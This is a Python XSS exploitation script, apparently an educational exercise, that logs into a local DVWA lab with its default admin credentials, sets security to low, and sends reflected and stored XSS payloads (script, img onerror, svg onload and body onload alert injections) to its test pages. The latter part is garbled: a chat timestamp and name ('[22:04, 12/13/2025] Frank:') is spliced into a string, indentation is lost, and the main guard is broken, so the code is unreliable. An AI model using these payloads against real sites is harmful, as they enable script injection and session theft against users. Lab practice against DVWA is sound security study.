#!/usr/bin/env python3
"""
XSS Exploitation Script for DVWA
Author: Daniel Oyanogbezina
Purpose: Educational demonstration of XSS vulnerabilities
"""

import requests
from bs4 import BeautifulSoup
import sys

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class Fore:
        CYAN = YELLOW = GREEN = RED = MAGENTA = WHITE = ""
    class Style:
        RESET_ALL = ""

TARGET_REFLECTED = "http://localhost/vulnerabilities/xss_r/"
TARGET_STORED = "http://localhost/vulnerabilities/xss_s/"
LOGIN_URL = "http://localhost/login.php"
SECURITY_URL = "http://localhost/security.php"

def print_banner():
    banner = f"""
{Fore.CYAN}{'='*70}
    XSS Exploitation Tool - DVWA
    Educational Purpose Only
{'='*70}{Style.RESET_ALL}
    """
    print(banner)

def get_authenticated_session():
    """Login to DVWA"""
    print(f"{Fore.YELLOW}[*] Logging into DVWA...{Style.RESET_ALL}")
    session = requests.Session()
    
    try:
        response = session.get(LOGIN_URL)
        login_data = {
            'username': 'admin',
            'password': 'password',
            'Login': 'Login'
        }
        session.post(LOGIN_URL, data=login_data)
        session.get(f"{SECURITY_URL}?security=low&seclev_submit=Submit")
        print(f"{Fore.GREEN}[+] Logged in successfully{Style.RESET_ALL}")
        return session
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        return None

def test_reflected_xss(session):
    """Test Reflected XSS"""
    print(f"\n{Fore.CYAN}[*] Testing Reflected XSS...{Style.RESET_ALL}")
    
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<body onload=alert('XSS')>"
    ]
    
    for payload in payloads:
        try:
            params = {'name': payload}
            response = session.get(TARGET_REFLECTED, params=params)
            
            if payload in response.text:
                print(f"{Fore.GREEN}[+] Payload executed: {payload}{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[-] Payload blocked: {payload}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error testing payload: {e}{Style.RESET_ALL}")

def test_stored_xss(session):
    """Test Stored XSS"""
    print(f"\n{Fore.CYAN}[*] Testing Stored XSS...{Style.RESET_ALL}")
    
    payload_name = "<script>alert('Stored XSS')</script>"
    payload_message = "Automated test"
    
    try:
        data = {
            'txtName': payload_name,
            'mtxMessage': payload_message,
            'btnSign': 'Sign Guestbook'
        }
        response = session.post(TARGET_STORED, data=data)
        
        if payload_name in response.text:
            print(f"{Fore.GREEN}[+] Stored XSS successful!{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Payload persisted in guestbook{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[-] Stored XSS blocked or
[22:04, 12/13/2025] Frank: filtered{Style.RESET_ALL}")
except Exception as e:
print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
def main():
print_banner()
session = get_authenticated_session()
if not session:
    print(f"{Fore.RED}[!] Failed to authenticate{Style.RESET_ALL}")
    sys.exit(1)

# Test Reflected XSS
test_reflected_xss(session)

# Test Stored XSS
test_stored_xss(session)

print(f"\n{Fore.MAGENTA}{'='*70}")
print(f"[!] Testing Complete")
print(f"[!] Educational purposes only")
print(f"{'='*70}{Style.RESET_ALL}\n")
if name == "main":
try:
main()
except KeyboardInterrupt:
print(f"\n{Fore.YELLOW}[!] Interrupted{Style.RESET_ALL}")
sys.exit(0)
